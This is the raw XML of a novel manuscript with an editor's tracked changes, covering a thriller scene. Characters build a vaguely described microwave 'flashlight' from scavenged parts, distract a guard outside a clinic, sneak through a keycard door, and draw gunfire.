        <w:t>the bag. Danny screwed it onto the back of the horn.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hell’s that thing?” asked Moshen.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“Well,” said Danny as he worked, “this part in front is a magnetron </w:t>
      </w:r>
      <w:del w:id="987" w:author="TextVet" w:date="2016-03-16T16:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E008FD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I ‘borrowed’ from a battleship radar system at Naval Base Kitsap.” He took the eight-pack of cylinders and affixed it to the back of the white tube.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xml:space="preserve"> is a bank of high-voltage </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ultracapacitors from a hybrid car powertrain.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w:t>
      </w:r>
      <w:ins w:id="988" w:author="TextVet" w:date="2016-03-16T16:10:00Z">
        <w:r w:rsidR="00BA1571">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="989" w:author="TextVet" w:date="2016-03-16T16:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BA1571">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He Velcro’ed the plastic cubes along the length of the tube.</w:t>
      </w:r>
      <w:ins w:id="990" w:author="TextVet" w:date="2016-03-16T16:10:00Z">
        <w:r w:rsidR="00BA1571">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="991" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BA1571">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 xml:space="preserve">“…is a set of relays for switching between serial charge and parallel discharge…” He pulled out a slotted metal box with vents and a socket. “This is the power conversion module,” Danny </w:t>
      </w:r>
      <w:del w:id="992" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A76711">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w:t>
      </w:r>
      <w:ins w:id="993" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidR="00A76711">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>eclared</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="994" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A76711">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>as he</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="995" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidR="00A76711">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>while</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attach</w:t>
      </w:r>
      <w:ins w:id="996" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidR="00A76711">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="997" w:author="TextVet" w:date="2016-03-16T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A76711">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it to the tube. “And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He pulled out a stack of laptop batteries. “…is a stack of laptop batteries.” The stack was about a dozen batteries high, all duct-taped together with their metal contacts tethered to one another with coils of cable.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stood up and held the device in both hands. Fully assembled, it was about four feet long. With the flick of a few switches, tiny lights lit up near the capacitor bank. Small fans whirred to life inside the power supply box. The device emitted a faint high-pitched whine that rose until it passed above the range of human hearing, like a high-end camera flashbulb charging up for a photograph.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held the pistol grip of the magnetron horn with his right hand, and slung the end of the PVC tube over his arm. His right shoulder bore the weight of the assorted duct-taped and snapped-in components on the back of the device.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men gawked. “Seriously, Danny, what is that thing?” demanded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gave a faint chuckle, “It’s just a… A flashlight.”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one elaborate flashlight,”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very bright,” said Danny, and inhaled sharply. “Alright, friends. Here’s what’s going to happen…”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>10</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black Lincoln Navigator</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> wound </w:t>
      </w:r>
      <w:del w:id="998" w:author="TextVet" w:date="2016-03-16T17:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">slowly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>around Tungsten’s parking lot</w:t>
      </w:r>
      <w:ins w:id="999" w:author="TextVet" w:date="2016-03-16T17:40:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> in</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1000" w:author="TextVet" w:date="2016-03-16T17:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001069A9">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a</w:t>
      </w:r>
      <w:ins w:id="1001" w:author="TextVet" w:date="2016-03-16T17:37:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> languid</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1002" w:author="TextVet" w:date="2016-03-16T17:40:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1003" w:author="TextVet" w:date="2016-03-16T17:37:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> anaconda</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1004" w:author="TextVet" w:date="2016-03-16T17:38:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s path</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1005" w:author="TextVet" w:date="2016-03-16T17:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>wkwardly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1006" w:author="TextVet" w:date="2016-03-16T17:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>weaving back and forth</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1007" w:author="TextVet" w:date="2016-03-16T17:39:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">that </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1008" w:author="TextVet" w:date="2016-03-16T17:40:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>suggested</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1009" w:author="TextVet" w:date="2016-03-16T17:39:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> the delica</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1010" w:author="TextVet" w:date="2016-03-16T17:41:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cy</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1011" w:author="TextVet" w:date="2016-03-16T17:40:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1012" w:author="TextVet" w:date="2016-03-16T17:39:00Z">
        <w:r w:rsidR="001069A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>of a state funeral</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The man standing by the door studied it apprehensively, and said something into his Bluetooth headset.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car came to a stop near the entrance. The driver-side window rolled down, revealing a middle-aged man with gelled gray hair.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Jason’s head drooped, his mouth hanging open and eyes unfocused. He </w:t>
      </w:r>
      <w:ins w:id="1013" w:author="TextVet" w:date="2016-03-17T09:15:00Z">
        <w:r w:rsidR="009602D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>inquire</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1014" w:author="TextVet" w:date="2016-03-17T09:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009602D0">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 in a slow, raspy whisper, “Is this the Weisenbaum Clinic? I see the big ‘W’ on the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the man barked. “Go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“Please, it’s very important,” Jason said, drawing out and enunciating each word. “I have an urgent medical condition. I need to go see…” His speech degenerated into a series of wheezes and coughs. “Can… Can you come closer please? It hurts for me to talk so loud.”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an exasperated sigh, the man took a few steps toward the SUV.</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know the phone number to the clinic,” Jason whispered breathily, “but my telephone is broken. Maybe you can make a call for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glared at him. “If I do, will you go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said something in Russian into his headset, his tone of annoyance crossing the language barrier. He pulled out his cellphone. “Okay, give me the number.”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“Four two five,” Jason said slowly, “Eight six five… Eight six five two? No, wait, eight six five three…”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“Eight six five eight six five two?” said the man, dialing the sequence.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“No, eight six five is just the first part. I was just repeating it to make sure you got it. Four two five, eight six five… Four two… Oh, you know what? I’m sorry. That’s my daughter’s number. The one to the clinic is four two five, eight five three… Wait, eight five or eight six…?”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growled.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="006877DC" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1015" w:author="TextVet" w:date="2016-03-17T09:17:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1016" w:author="TextVet" w:date="2016-03-17T09:17:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="006877DC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With his attention f</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ocused on trying to dial Jason’s number, he </w:t>
      </w:r>
      <w:ins w:id="1017" w:author="TextVet" w:date="2016-03-17T09:18:00Z">
        <w:r w:rsidR="00370042">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>coul</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1018" w:author="TextVet" w:date="2016-03-17T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00370042">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>di</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">dn’t notice the green light pop on above the keycard reader behind him. Nor </w:t>
      </w:r>
      <w:ins w:id="1019" w:author="TextVet" w:date="2016-03-17T09:19:00Z">
        <w:r w:rsidR="00CD62B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>coul</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1020" w:author="TextVet" w:date="2016-03-17T09:19:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00CD62B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>di</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d he notice Mike</w:t>
      </w:r>
      <w:ins w:id="1021" w:author="TextVet" w:date="2016-03-17T09:19:00Z">
        <w:r w:rsidR="008425E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tiptoeing his way along the wall, </w:t>
      </w:r>
      <w:ins w:id="1022" w:author="TextVet" w:date="2016-03-17T09:20:00Z">
        <w:r w:rsidR="008425E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>spidering</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1023" w:author="TextVet" w:date="2016-03-17T09:20:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008425E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>making his way silently</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> toward the entrance</w:t>
      </w:r>
      <w:del w:id="1024" w:author="TextVet" w:date="2016-03-17T09:23:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="009D1F8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1025" w:author="TextVet" w:date="2016-03-17T09:23:00Z">
        <w:r w:rsidR="009D1F8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>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Until Mike finally ducked through the big glass door. As Mike’s body slid into the light pouring from the lobby, his shadow swept across the parking lot.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cursed silently. He should’ve anticipated that. He hadn’t.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the fuck!” the man said. He turned his head just in time to see Mike heading into the hallway.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when the man’s cellphone exploded.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phone jumped in his hand with a loud “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crack!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” A shower of white sparks burst somewhere within, spilling out from the sides and from the seams around the buttons. Arcs of electricity flashed across its face. The man yelped</w:t>
      </w:r>
      <w:ins w:id="1026" w:author="TextVet" w:date="2016-03-17T09:24:00Z">
        <w:r w:rsidR="00E249D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1027" w:author="TextVet" w:date="2016-03-17T09:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E249D4">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dropp</w:t>
      </w:r>
      <w:ins w:id="1028" w:author="TextVet" w:date="2016-03-17T09:24:00Z">
        <w:r w:rsidR="00E249D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1029" w:author="TextVet" w:date="2016-03-17T09:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E249D4">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it</w:t>
      </w:r>
      <w:del w:id="1030" w:author="TextVet" w:date="2016-03-17T09:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E249D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to the ground</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slammed on the gas. The SUV’s tires squealed on the pavement. He steered a zigzagging pattern back out to the street.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man’s head swiveled from the building to the car. He let his jacket fall to the ground and drew the silenced semiautomatic up to shoulder height. He held the gun with both hands, took aim, and pulled the trigger several times. The gun didn’t make a “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bang!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” It did, however, make a distinct popping noise, together with the loud “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>clack!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” of interlocking</w:t>
      </w:r>
      <w:ins w:id="1031" w:author="TextVet" w:date="2016-03-17T09:26:00Z">
        <w:r w:rsidR="00B16FE0">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spring-loaded metal parts snapping into place.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1032" w:author="TextVet" w:date="2016-03-17T09:27:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Fuck!”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
